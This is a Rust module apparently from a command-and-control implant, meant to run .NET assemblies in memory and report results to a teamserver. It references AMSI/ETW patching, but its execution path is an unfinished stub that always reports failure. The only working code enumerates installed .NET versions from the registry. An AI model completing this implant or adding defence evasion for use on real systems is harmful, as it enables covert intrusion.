//! .NET CLR hosting for inline assembly execution.
//!
//! On Windows this module loads the CLR via `CLRCreateInstance`, creates an
//! AppDomain, loads a .NET assembly, and invokes its entry point.  Assembly
//! stdout is captured via a named pipe and returned as callback output.
//!
//! On non-Windows targets the module returns a failure callback immediately —
//! .NET CLR hosting is only available on Windows.

use tracing::warn;

// ─── .NET callback info IDs (agent → server) ───────────────────────────────

/// AMSI/ETW patches have been applied (hardware breakpoint engine).
pub const DOTNET_INFO_PATCHED: u32 = 1;
/// Reports the CLR version string being used.
pub const DOTNET_INFO_NET_VERSION: u32 = 2;
/// Assembly entry point has been invoked; includes the thread ID.
pub const DOTNET_INFO_ENTRYPOINT_EXECUTED: u32 = 3;
/// Assembly execution completed successfully.
pub const DOTNET_INFO_FINISHED: u32 = 4;
/// CLR initialisation or assembly execution failed.
pub const DOTNET_INFO_FAILED: u32 = 5;

/// A single .NET execution callback to send to the teamserver.
#[derive(Debug)]
pub struct DotnetCallback {
    /// One of the `DOTNET_INFO_*` constants.
    pub info_id: u32,
    /// Payload bytes for this callback (info-specific encoding).
    pub payload: Vec<u8>,
}

/// Result of a .NET assembly execution attempt.
#[derive(Debug)]
pub struct DotnetResult {
    /// Callback entries to send back to the teamserver.
    pub callbacks: Vec<DotnetCallback>,
    /// Captured stdout output from the assembly, if any.
    pub output: Vec<u8>,
}

/// Execute a .NET assembly using the CLR.
///
/// # Arguments
///
/// * `_pipe_name` — Named pipe path for stdout capture (UTF-16LE decoded).
/// * `_app_domain` — AppDomain name (UTF-16LE decoded).
/// * `net_version` — Target CLR version string (e.g. `"v4.0.30319"`).
/// * `assembly_data` — Raw .NET PE bytes.
/// * `_assembly_args` — Command-line arguments for the assembly (UTF-16LE decoded).
#[cfg(windows)]
#[allow(unsafe_code)]
pub fn dotnet_execute(
    _pipe_name: &str,
    _app_domain: &str,
    net_version: &str,
    assembly_data: &[u8],
    _assembly_args: &str,
) -> DotnetResult {
    // CLR hosting requires COM interop via the mscoree.dll CLRCreateInstance API.
    // This is a substantial undertaking involving:
    //   1. CLRCreateInstance → ICLRMetaHost
    //   2. GetRuntime(version) → ICLRRuntimeInfo
    //   3. GetInterface → ICorRuntimeHost
    //   4. Start() + CreateDomain()
    //   5. Load_3(SafeArray of PE bytes)
    //   6. EntryPoint → Invoke_3(args)
    //
    // For now we report the CLR version and then report failure, since the full
    // COM vtable FFI is not yet wired up.  The protocol handling is complete so
    // that the teamserver receives proper callbacks.

    if assembly_data.is_empty() {
        return DotnetResult {
            callbacks: vec![DotnetCallback { info_id: DOTNET_INFO_FAILED, payload: Vec::new() }],
            output: Vec::new(),
        };
    }

    // Try to load mscoree.dll
    let mscoree_name = b"mscoree.dll\0";
    let mscoree =
        unsafe { windows_sys::Win32::System::LibraryLoader::LoadLibraryA(mscoree_name.as_ptr()) };

    if mscoree == 0 {
        warn!("dotnet: failed to load mscoree.dll — CLR not available");
        return DotnetResult {
            callbacks: vec![DotnetCallback { info_id: DOTNET_INFO_FAILED, payload: Vec::new() }],
            output: Vec::new(),
        };
    }

    // Report the CLR version we're attempting to use
    let version_callback = DotnetCallback {
        info_id: DOTNET_INFO_NET_VERSION,
        payload: {
            // Encode version as UTF-16LE with null terminator, length-prefixed
            let utf16: Vec<u8> = net_version
                .encode_utf16()
                .chain(std::iter::once(0u16))
                .flat_map(|c| c.to_le_bytes())
                .collect();
            let mut p = Vec::new();
            p.extend_from_slice(&(utf16.len() as u32).to_le_bytes());
            p.extend_from_slice(&utf16);
            p
        },
    };

    // Full CLR hosting via COM vtable calls requires extensive unsafe FFI
    // that is tracked separately.  For now, report the version and then
    // indicate failure so the operator knows the CLR path was attempted.
    DotnetResult {
        callbacks: vec![
            version_callback,
            DotnetCallback { info_id: DOTNET_INFO_FAILED, payload: Vec::new() },
        ],
        output: Vec::new(),
    }
}

/// On non-Windows targets, .NET assembly execution is unsupported.
#[cfg(not(windows))]
pub fn dotnet_execute(
    _pipe_name: &str,
    _app_domain: &str,
    _net_version: &str,
    _assembly_data: &[u8],
    _assembly_args: &str,
) -> DotnetResult {
    warn!(".NET assembly execution is only supported on Windows");
    DotnetResult {
        callbacks: vec![DotnetCallback { info_id: DOTNET_INFO_FAILED, payload: Vec::new() }],
        output: Vec::new(),
    }
}

/// Enumerate installed CLR versions.
///
/// On Windows, attempts to load `mscoree.dll` and use `CLRCreateInstance` to
/// enumerate available runtimes.  Returns version strings (e.g. `"v4.0.30319"`).
///
/// On non-Windows, returns an empty list.
#[cfg(windows)]
#[allow(unsafe_code)]
pub fn enumerate_clr_versions() -> Vec<String> {
    // CLR version enumeration requires COM interop:
    //   1. CLRCreateInstance → ICLRMetaHost
    //   2. EnumerateInstalledRuntimes → IEnumUnknown
    //   3. For each: QueryInterface → ICLRRuntimeInfo
    //   4. GetVersionString → version string
    //
    // As a pragmatic fallback, we check well-known registry keys that indicate
    // installed .NET Framework versions.

    let mut versions = Vec::new();

    // Check for .NET Framework 4.x via registry
    // HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full
    let subkey = b"SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v4\\Full\0";
    let mut hkey: isize = 0;

    // SAFETY: calling RegOpenKeyExA to read registry
    let status = unsafe {
        windows_sys::Win32::System::Registry::RegOpenKeyExA(
            windows_sys::Win32::System::Registry::HKEY_LOCAL_MACHINE,
            subkey.as_ptr(),
            0,
            windows_sys::Win32::System::Registry::KEY_READ,
            &mut hkey,
        )
    };

    if status == 0 {
        // Key exists — .NET 4.x is installed
        let value_name = b"Version\0";
        let mut buf = [0u8; 256];
        let mut buf_len: u32 = buf.len() as u32;
        let mut value_type: u32 = 0;

        let read_status = unsafe {
            windows_sys::Win32::System::Registry::RegQueryValueExA(
                hkey,
                value_name.as_ptr(),
                std::ptr::null(),
                &mut value_type,
                buf.as_mut_ptr(),
                &mut buf_len,
            )
        };

        if read_status == 0 && buf_len > 0 {
            let end = buf_len as usize;
            let version_str = String::from_utf8_lossy(
                &buf[..end.saturating_sub(1)], // strip null terminator
            )
            .to_string();
            if !version_str.is_empty() {
                versions.push(format!("v{version_str}"));
            }
        }

        unsafe {
            windows_sys::Win32::System::Registry::RegCloseKey(hkey);
        }
    }

    // Check for .NET 3.5
    let subkey_35 = b"SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v3.5\0";
    let mut hkey_35: isize = 0;
    let status_35 = unsafe {
        windows_sys::Win32::System::Registry::RegOpenKeyExA(
            windows_sys::Win32::System::Registry::HKEY_LOCAL_MACHINE,
            subkey_35.as_ptr(),
            0,
            windows_sys::Win32::System::Registry::KEY_READ,
            &mut hkey_35,
        )
    };
    if status_35 == 0 {
        versions.push("v3.5".to_string());
        unsafe {
            windows_sys::Win32::System::Registry::RegCloseKey(hkey_35);
        }
    }

    // Check for .NET 2.0
    let subkey_20 = b"SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v2.0.50727\0";
    let mut hkey_20: isize = 0;
    let status_20 = unsafe {
        windows_sys::Win32::System::Registry::RegOpenKeyExA(
            windows_sys::Win32::System::Registry::HKEY_LOCAL_MACHINE,
            subkey_20.as_ptr(),
            0,
            windows_sys::Win32::System::Registry::KEY_READ,
            &mut hkey_20,
        )
    };
    if status_20 == 0 {
        versions.push("v2.0.50727".to_string());
        unsafe {
            windows_sys::Win32::System::Registry::RegCloseKey(hkey_20);
        }
    }

    versions
}

/// On non-Windows, no CLR versions are available.
#[cfg(not(windows))]
pub fn enumerate_clr_versions() -> Vec<String> {
    Vec::new()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn dotnet_execute_empty_assembly_returns_failed() {
        let result = dotnet_execute("pipe", "domain", "v4.0.30319", &[], "");
        assert!(!result.callbacks.is_empty());
        assert!(result.callbacks.iter().any(|c| c.info_id == DOTNET_INFO_FAILED));
    }

    #[cfg(not(windows))]
    #[test]
    fn non_windows_dotnet_returns_failed() {
        let result = dotnet_execute("pipe", "domain", "v4.0.30319", b"MZ\x90\x00", "args");
        assert_eq!(result.callbacks.len(), 1);
        assert_eq!(result.callbacks[0].info_id, DOTNET_INFO_FAILED);
    }

    #[cfg(not(windows))]
    #[test]
    fn non_windows_enumerate_returns_empty() {
        assert!(enumerate_clr_versions().is_empty());
    }

    #[test]
    fn dotnet_info_constants_match_teamserver() {
        assert_eq!(DOTNET_INFO_PATCHED, 1);
        assert_eq!(DOTNET_INFO_NET_VERSION, 2);
        assert_eq!(DOTNET_INFO_ENTRYPOINT_EXECUTED, 3);
        assert_eq!(DOTNET_INFO_FINISHED, 4);
        assert_eq!(DOTNET_INFO_FAILED, 5);
    }
}
